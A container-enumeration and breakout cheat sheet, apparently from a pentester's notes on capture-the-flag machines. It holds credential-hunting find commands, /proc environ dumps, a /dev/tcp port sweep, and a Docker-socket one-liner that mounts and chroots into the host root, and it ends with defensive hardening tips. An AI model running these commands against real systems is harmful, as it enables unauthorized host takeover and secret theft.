# Docker / Container Enumeration -- From Inside the Container

Used on: **Internal**

Internal addition: Jenkins RCE landed inside a container; basic overlay/capability checks plus text-file hunting led to `/opt/note.txt`.

Used on: **ohmyweb**, **MonitorsFour**, **Silentium**

You popped a shell. Before chasing local privesc, figure out **whether you're in a container** and -- if you are -- **what you can reach from it**: capabilities, mounts, sibling containers, the host gateway, the Docker socket. Containers are leaky by default; the right two-line check often hands you root on the host.

This is the focused container-from-the-inside checklist. The full Linux post-foothold sweep lives in [linux-enumeration.md](../enumeration/linux-enumeration.md); this note zooms in on the container-specific parts and the breakout primitives.

## 1. Am I In a Container

Run all of these -- any positive is enough.

```bash
ls /.dockerenv                              # exists on every Docker container
ls /run/.containerenv                       # podman equivalent
cat /proc/1/cgroup                          # docker / kubepods / lxc / containerd lines
cat /proc/self/cgroup | grep -E 'docker|kubepods|lxc|containerd'
systemd-detect-virt --container             # "docker" / "lxc" / "none"
hostname                                    # often the short container ID
cat /etc/hostname
mount | grep -E 'overlay|aufs'              # overlay rootfs is a strong hint
cat /proc/mounts | grep -E 'overlay|aufs'
```
Used on: **ohmyweb** (hostname `4a70924bafa0` -- a Docker short ID), **MonitorsFour**, **Silentium**

## 2. What Capabilities Do I Have

Capabilities are what separate "I'm in a sandbox" from "I'm basically root with some restrictions".

```bash
cat /proc/self/status | grep -E '^Cap'
# CapInh:  0000000000000000
# CapPrm:  0000000000000000
# CapEff:  0000000000000000
# CapBnd:  0000000000000000
# CapAmb:  0000000000000000
```
Used on: **ohmyweb** (all zero -> daemon, no caps), **MonitorsFour**

Decode any non-zero mask:
```bash
capsh --decode=$(awk '/^CapEff/ {print $2}' /proc/self/status)
# or, in a one-liner without capsh:
python3 -c "
import sys
m = int(sys.argv[1], 16)
caps = ['chown','dac_override','dac_read_search','fowner','fsetid','kill','setgid','setuid','setpcap','linux_immutable','net_bind_service','net_broadcast','net_admin','net_raw','ipc_lock','ipc_owner','sys_module','sys_rawio','sys_chroot','sys_ptrace','sys_pacct','sys_admin','sys_boot','sys_nice','sys_resource','sys_time','sys_tty_config','mknod','lease','audit_write','audit_control','setfcap','mac_override','mac_admin','syslog','wake_alarm','block_suspend','audit_read','perfmon','bpf','checkpoint_restore']
print(','.join(c for i,c in enumerate(caps) if m & (1<<i)))" 00000000a80425fb
```

| `CapEff` value | What you got |
|----------------|--------------|
| `0000000000000000` | Stripped container -- breakout via mounts/network only |
| `00000000a80425fb` | Default Docker (no `--privileged`) -- 14 caps, escapable via various paths |
| `0000003fffffffff` | `--privileged` -- you ARE root on the host once you mount `/dev/sda` |
| Has `cap_sys_admin` | Mount, namespace tricks, `release_agent` breakout |
| Has `cap_sys_module` | `init_module` -> kernel rootkit -> host root |

Container with `cap_dac_read_search` reads any file on the **container fs** -- combine with mount inspection (next section) to read host files.

## 3. Mounts -- Find the Host Filesystem

```bash
mount
cat /proc/mounts                            # read-only when /proc is hardened
cat /proc/self/mountinfo                    # the most detailed view
findmnt 2>/dev/null
df -h
ls -la /                                    # any unexpected dirs (like /host, /mnt/host)
```
Used on: **ohmyweb**

What to look for:
- `/var/run/docker.sock` mounted in -> [docker-api-unauthenticated.md](docker-api-unauthenticated.md), one-liner host root.
- `/` mounted from the host -- `--privileged` boxes, or developer mounts like `-v /:/host`.
- `/etc/hosts`, `/etc/resolv.conf`, `/etc/hostname` mounted from `/dev/mapper/<host-vg>-<host-lv>` -> the host volume is **right there**, even if you can't read it directly the host VG name is leaking.
- Any host-mounted dir under `/mnt`, `/host`, `/data`.
- A bind-mounted `~/.ssh/`, kubeconfig, GCP/AWS metadata file.

Sample `proc/mounts` from ohmyweb:
```
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/resolv.conf ext4 rw,relatime 0 0
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hostname    ext4 rw,relatime 0 0
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hosts       ext4 rw,relatime 0 0
```
The host's LVM device is named -- useful when chaining a privileged escape that needs to mount the host volume.

## 4. The Docker Socket Check (One-Line Game Over)

```bash
ls -la /var/run/docker.sock                 # if exists + writable -> game over
curl --unix-socket /var/run/docker.sock http://x/version
```

If the socket is mounted in (and we have `docker` installed or can drop a static `docker` binary), spawn a privileged container that bind-mounts host `/`:
```bash
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt --privileged alpine chroot /mnt sh
```
Full chain in [docker-api-unauthenticated.md](docker-api-unauthenticated.md) and [docker-group-escape.md](../privesc-linux/docker-group-escape.md).

## 5. Network Reach

```bash
ip a 2>/dev/null || ifconfig                # eth0 typically 172.17.0.X
ip route 2>/dev/null || route -n            # default via 172.17.0.1 = host gateway
cat /etc/resolv.conf                        # nameserver often = host or sibling
ss -tnlp 2>/dev/null || netstat -tnlp
```
Used on: **ohmyweb**

The standard map after this:
- `eth0 = 172.17.0.X/16` -> Docker default bridge.
- Gateway `172.17.0.1` = host. Often runs internal services not bound on the public IP (Docker API, OMI, kubelet, admin panels).
- Sibling containers on `172.17.0.Y` (Y != X) reachable directly.

Without `nmap`/`nc` installed, drop a static binary: see [container-network-pivoting.md](container-network-pivoting.md). Bash-only port check:
```bash
for p in 22 80 2375 2376 5985 5986 8080 6443 10250; do
  (timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$p") 2>/dev/null && echo "open: $p"
done
```

Ports worth knowing:
| Port | Service | Why we care |
|------|---------|-------------|
| `2375` / `2376` | Docker API | unauthenticated -> host root |
| `5985` / `5986` | WSMan / OMI | OMIGOD CVE-2021-38647 |
| `6443` | Kubernetes API | misconfigured -> cluster takeover |
| `10250` | kubelet | unauthenticated read on many clusters |
| `2379` / `2380` | etcd | secrets at rest |
| `8080`, `8081`, `9000` | internal admin | rarely auth'd from inside the bridge |

## 6. Suspicious / Known-Useful Files

```bash
ls -la /                                        # /host, /mnt, /data, etc.
ls -la /root /home /opt /srv                    # mounted-in dev artefacts
find / -name '.dockercfg' -o -name 'config.json' 2>/dev/null    # docker auth
find / -name 'kubeconfig' -o -path '*/.kube/config' 2>/dev/null # k8s creds
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null
find / -name '.env' -exec ls -l {} \; 2>/dev/null
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'  # init env -- often the secrets
cat /proc/self/environ | tr '\0' '\n'
```
Used on: **ohmyweb** (the env grep, `find -name id_rsa`)

Process tree -- look for the privileged sibling:
```bash
ps -ef                                  # PID 1 in a container is your app, not init
ps -eo pid,user,cmd                     # any root processes sidecars
cat /proc/*/cgroup 2>/dev/null | sort -u
```

## 7. Privileged-Container Tells

Run these only if you see signs you might be `--privileged`:

```bash
# Block devices visible inside the container -> --privileged
ls -la /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null

# Capability bitmask is full
grep CapEff /proc/self/status   # 0000003fffffffff or 0000007fffffffff

# Can we mount
mount -t tmpfs tmpfs /tmp/test 2>&1

# release_agent breakout (cgroups v1)
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null && echo "cgroups v1 mountable -> release_agent escape"
```

## 8. Common Breakout Primitives -- Quick Reference

| Inside the container | Breakout |
|----------------------|----------|
| `/var/run/docker.sock` mounted | `docker run -v /:/host --privileged` -- [docker-api-unauthenticated.md](docker-api-unauthenticated.md) |
| User in `docker` group on host (rare in-container, common on dev hosts) | same chain -- [docker-group-escape.md](../privesc-linux/docker-group-escape.md) |
| `--privileged` (full caps + `/dev/sda` visible) | mount host disk and `chroot` |
| `cap_sys_admin` only | cgroups v1 `release_agent` trick |
| `cap_sys_module` | load a kernel module |
| Host filesystem at `/host`, `/mnt/host`, `/rootfs` | edit `/etc/cron.d/` or drop SSH key |
| Sibling container with the bug | [container-network-pivoting.md](container-network-pivoting.md) |
| Privileged service on `172.17.0.1` | OMIGOD ([omigod-rce.md](../web-rce/omigod-rce.md)), Docker API, etc. |

## When to Use

- You have a shell and the hostname looks like a short hex string (e.g. `4a70924bafa0`) — almost always a Docker container ID.
- `ls /.dockerenv` succeeds, or `/proc/1/cgroup` contains `docker`, `kubepods`, or `lxc`.
- A web app runs as `daemon` (uid 1) instead of `www-data` — typical of stripped Apache container images.
- You see `overlay` or `aufs` filesystems in `mount` output.

## Defensive Note

- Drop all caps you don't need: `--cap-drop=ALL --cap-add=NET_BIND_SERVICE` is a sane default for web servers.
- Never bind-mount `/var/run/docker.sock` into an internet-facing container.
- Don't run `--privileged`; if you must, isolate that container on its own network.
- User-namespaced Docker (`userns-remap`) makes the inevitable escape land as a fake-uid host user instead of root.

## Related
- [linux-enumeration.md](../enumeration/linux-enumeration.md) -- the full Linux sweep this slots into
- [container-network-pivoting.md](container-network-pivoting.md) -- once you've mapped the bridge
- [linux-capabilities-privesc.md](../privesc-linux/linux-capabilities-privesc.md) -- inside-the-container privesc
- [docker-api-unauthenticated.md](docker-api-unauthenticated.md) -- exposed Docker API breakout
- [docker-group-escape.md](../privesc-linux/docker-group-escape.md) -- on the host side
- [docker](../../tools/container/docker.md), [getcap](../../tools/container/getcap.md)


